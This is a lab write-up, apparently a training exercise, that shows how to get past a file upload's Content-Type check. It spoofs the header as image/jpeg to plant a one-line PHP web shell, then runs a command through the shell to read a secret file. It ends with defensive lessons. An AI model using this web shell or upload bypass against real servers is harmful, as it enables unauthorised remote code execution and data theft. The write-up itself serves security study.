# File Upload - Web Shell Upload via Content-Type Bypass

## Overview
This lab demonstrates how flawed file type validation can be bypassed by manipulating the Content-Type header in a file upload request.

## Vulnerability
The application attempts to restrict file uploads to image formats (JPEG/PNG) by checking the Content-Type header. However, this validation is flawed because the header is user-controlled and does not verify the actual file content.

## Objective
Upload a web shell and use it to read the contents of the file:
/home/carlos/secret

## Reconnaissance
The application provides an avatar upload feature that restricts file uploads to image types. Direct upload of a PHP file is blocked with an error.

## Exploitation

### Step 1: Create Web Shell
Created a PHP web shell:

<?php system($_GET['command']); ?>

---

### Step 2: Intercept Upload Request
- Attempted to upload the PHP file.
- Intercepted the request using Burp Suite.

---

### Step 3: Bypass Content-Type Validation
- Modified the request header:
  
Original:
Content-Type: application/x-php

Modified:
Content-Type: image/jpeg

- Forwarded the request.

---

### Step 4: Upload Successful
- The server accepted the file due to the manipulated Content-Type.

---

### Step 5: Locate Uploaded File
- Accessed the uploaded file via:
/files/avatars/webshell.php

---

### Step 6: Execute Commands
Executed:

/files/avatars/webshell.php?command=cat%20/home/carlos/secret

---

## Result
Successfully bypassed file type validation and achieved remote code execution.

## Evidence
- Screenshot of blocked upload attempt
<img width="1117" height="254" alt="image" src="https://github.com/user-attachments/assets/c0f113d9-9c68-483a-970d-4276f1f90021" />

- Screenshot of intercepted request
<img width="1316" height="586" alt="image" src="https://github.com/user-attachments/assets/4b13e905-2fd5-4c4f-9461-17ce38e8172e" />

- Screenshot of modified Content-Type
<img width="508" height="334" alt="image" src="https://github.com/user-attachments/assets/d1ef4bc8-0153-4337-aefa-a8c7c20fd860" />

- Screenshot of successful upload
<img width="494" height="340" alt="image" src="https://github.com/user-attachments/assets/014bcb18-6aae-4afd-b29f-3fee9512e14d" />

- Screenshot of lab completion
<img width="925" height="470" alt="image" src="https://github.com/user-attachments/assets/1e57fc13-0ed7-4c57-88fe-121fa1e7d54c" />



## Tools Used
- Burp Suite (Proxy + Repeater)
- Browser

## Key Learning
- MIME type validation is not secure if it relies on user input.
- Attackers can manipulate headers to bypass restrictions.
- File content must be validated, not just metadata.
- Improper validation can lead to full server compromise.
